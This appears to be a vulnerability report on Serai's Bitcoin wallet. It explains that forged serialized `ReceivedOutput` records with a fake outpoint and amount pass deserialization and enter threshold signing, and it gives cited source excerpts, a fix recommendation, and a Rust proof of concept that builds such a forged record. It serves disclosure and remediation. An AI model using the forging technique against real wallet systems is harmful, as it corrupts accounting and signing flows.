### Title
Forged `ReceivedOutput` records create signed transactions spending nonexistent UTXOs - ([File: networks/bitcoin/src/wallet/mod.rs](networks/bitcoin/src/wallet/mod.rs))

### Summary
`ReceivedOutput::read` deserializes the spending offset, claimed `TxOut`, and claimed `OutPoint` independently, without authenticating that the outpoint exists or contains that output. `SignableTransaction::new` then trusts the embedded value and outpoint, while `SignableTransaction::multisig` only checks that the output script corresponds to the tweaked threshold key. Consequently, a crafted serialized output can claim an arbitrary amount at a fake outpoint while still entering transaction signing.

### Finding Description
`ReceivedOutput::read` accepts an attacker-controlled scalar, consensus-encoded `TxOut`, and consensus-encoded `OutPoint`, then returns them without validating their relationship against confirmed blockchain data. [1](#0-0) 

The scanner normally creates this invariant by copying a real transaction output and its real outpoint into `ReceivedOutput`, but that invariant is not preserved or authenticated by the serialized representation. [2](#0-1) 

`SignableTransaction::new` treats the serialized `TxOut` amount as spendable input value and uses the serialized `OutPoint` directly as the transaction input. [3](#0-2) 

It later stores the same attacker-declared `TxOut` in `prevouts`, which is the data committed by Taproot sighash verification. [4](#0-3) 

Before signing, `multisig` verifies only that `keys.offset(offset).group_key()` maps to the declared output’s `script_pubkey`; it does not validate that the declared outpoint contains that output. [5](#0-4) 

### Impact Explanation
An attacker can fabricate a received-output record claiming that the threshold wallet owns an arbitrary amount at an unused or nonexistent outpoint. Serai will account for the fake amount, construct a transaction, and produce valid Schnorr signatures over the fabricated prevouts, but Bitcoin consensus will reject the transaction because the referenced UTXO does not exist or does not contain the declared output.

This maps the malicious-file bug class to Serai’s deserialization boundary: crafted bytes accepted by `ReceivedOutput::read` produce an internally inconsistent spendable-output object, resulting in funds reported as received that are not spendable.

### Likelihood Explanation
The attacker needs the ability to supply serialized `ReceivedOutput` bytes to a wallet/signing path. The needed script does not require knowledge of a private offset: `Scanner::new` always recognizes the base key’s Taproot script with `Scalar::ZERO`, so a forged record can use offset zero and a script derived solely from the public group key. [6](#0-5) 

### Recommendation
Do not treat deserialized `ReceivedOutput` values as authenticated scan results. Before creating a `SignableTransaction`, revalidate every `outpoint` against a trusted Bitcoin node or confirmed block data and require the chain’s actual output to equal the stored `TxOut`. If received outputs are persisted, authenticate the database records or serialize a commitment to the scanner-derived `(outpoint, output, offset)` invariant and reject records that were not produced by authenticated scanning.

### Proof of Concept
```rust
use bitcoin::{
  consensus::encode::serialize,
  transaction::OutPoint,
  Amount, TxOut, Txid,
};
use frost::curve::Secp256k1;
use k256::Scalar;
use serai_bitcoin::wallet::{
  p2tr_script_buf, ReceivedOutput, SignableTransaction,
};

fn forged_received_output(
  keys: &frost::ThresholdKeys<Secp256k1>,
) -> ReceivedOutput {
  // The base-key output uses offset zero.
  let script = p2tr_script_buf(keys.group_key()).unwrap();

  // This output was never confirmed on-chain.
  let fake_output = TxOut {
    value: Amount::from_sat(1_000_000),
    script_pubkey: script,
  };

  let fake_outpoint = OutPoint {
    txid: Txid::all_zeros(),
    vout: 0,
  };

  let mut encoded = Vec::new();
  encoded.extend(Scalar::ZERO.to_bytes());
  encoded.extend(serialize(&fake_output));
  encoded.extend(serialize(&fake_outpoint));

  // Accepted without authenticating the outpoint/output pair.
  ReceivedOutput::read(&mut encoded.as_slice()).unwrap()
}

let forged = forged_received_output(&keys);

// The fake million-sat input is accepted as available value.
let signable = SignableTransaction::new(
  vec![forged],
  &[(payment_script, 546)],
  Some(change_script),
  None,
  fee_per_vbyte,
).unwrap();

// The script check passes because the forged output really is encoded
// for keys.group_key() with offset zero; only the claimed UTXO is fake.
let machine = signable.multisig(&keys).unwrap();

// Signing succeeds over the fabricated prevout set, while broadcasting the
// resulting transaction fails because the referenced UTXO is nonexistent.
```

The critical distinction is that Schnorr signing verifies consistency with the supplied `Prevouts::All`, not UTXO existence or chain membership. [7](#0-6)

### Citations

**File:** networks/bitcoin/src/wallet/mod.rs (L120-133)
```rust
  /// Read a ReceivedOutput from a generic satisfying Read.
  #[cfg(feature = "std")]
  pub fn read<R: Read>(r: &mut R) -> io::Result<ReceivedOutput> {
    let offset = Secp256k1::read_F(r)?;
    let output;
    let outpoint;
    {
      let mut buf_r = BufReader::with_capacity(0, r);
      output =
        TxOut::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid TxOut"))?;
      outpoint =
        OutPoint::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid OutPoint"))?;
    }
    Ok(ReceivedOutput { offset, output, outpoint })
```

**File:** networks/bitcoin/src/wallet/mod.rs (L162-165)
```rust
  pub fn new(key: ProjectivePoint) -> Option<Scanner> {
    let mut scripts = HashMap::new();
    scripts.insert(p2tr_script_buf(key)?, Scalar::ZERO);
    Some(Scanner { key, scripts })
```

**File:** networks/bitcoin/src/wallet/mod.rs (L199-211)
```rust
  pub fn scan_transaction(&self, tx: &Transaction) -> Vec<ReceivedOutput> {
    let mut res = Vec::new();
    for (vout, output) in tx.output.iter().enumerate() {
      // If the vout index exceeds 2**32, stop scanning outputs
      let Ok(vout) = u32::try_from(vout) else { break };

      if let Some(offset) = self.scripts.get(&output.script_pubkey) {
        res.push(ReceivedOutput {
          offset: *offset,
          output: output.clone(),
          outpoint: OutPoint::new(tx.compute_txid(), vout),
        });
      }
```

**File:** networks/bitcoin/src/wallet/send.rs (L175-185)
```rust
    let input_sat = inputs.iter().map(|input| input.output.value.to_sat()).sum::<u64>();
    let offsets = inputs.iter().map(|input| input.offset).collect();
    let tx_ins = inputs
      .iter()
      .map(|input| TxIn {
        previous_output: input.outpoint,
        script_sig: ScriptBuf::new(),
        sequence: Sequence::MAX,
        witness: Witness::new(),
      })
      .collect::<Vec<_>>();
```

**File:** networks/bitcoin/src/wallet/send.rs (L245-254)
```rust
    Ok(SignableTransaction {
      tx: Transaction {
        version: Version(2),
        lock_time: LockTime::ZERO,
        input: tx_ins,
        output: tx_outs,
      },
      offsets,
      prevouts: inputs.drain(..).map(|input| input.output).collect(),
      needed_fee,
```

**File:** networks/bitcoin/src/wallet/send.rs (L273-281)
```rust
  pub fn multisig(self, keys: &ThresholdKeys<Secp256k1>) -> Option<TransactionMachine> {
    let mut sigs = vec![];
    for i in 0 .. self.tx.input.len() {
      let offset = keys.clone().offset(self.offsets[i]);
      if p2tr_script_buf(offset.group_key())? != self.prevouts[i].script_pubkey {
        None?;
      }

      sigs.push(AlgorithmMachine::new(Schnorr::new(), keys.clone().offset(self.offsets[i])));
```

**File:** networks/bitcoin/src/wallet/send.rs (L373-390)
```rust
    let mut cache = SighashCache::new(&self.tx.tx);
    // Sign committing to all inputs
    let prevouts = Prevouts::All(&self.tx.prevouts);

    let mut shares = Vec::with_capacity(self.sigs.len());
    let sigs = self
      .sigs
      .drain(..)
      .enumerate()
      .map(|(i, sig)| {
        let (sig, share) = sig.sign(
          commitments[i].clone(),
          cache
            .taproot_key_spend_signature_hash(i, &prevouts, TapSighashType::Default)
            // This should never happen since the inputs align with the TX the cache was
            // constructed with, and because i is always < prevouts.len()
            .expect("taproot_key_spend_signature_hash failed to return a hash")
            .as_ref(),
```
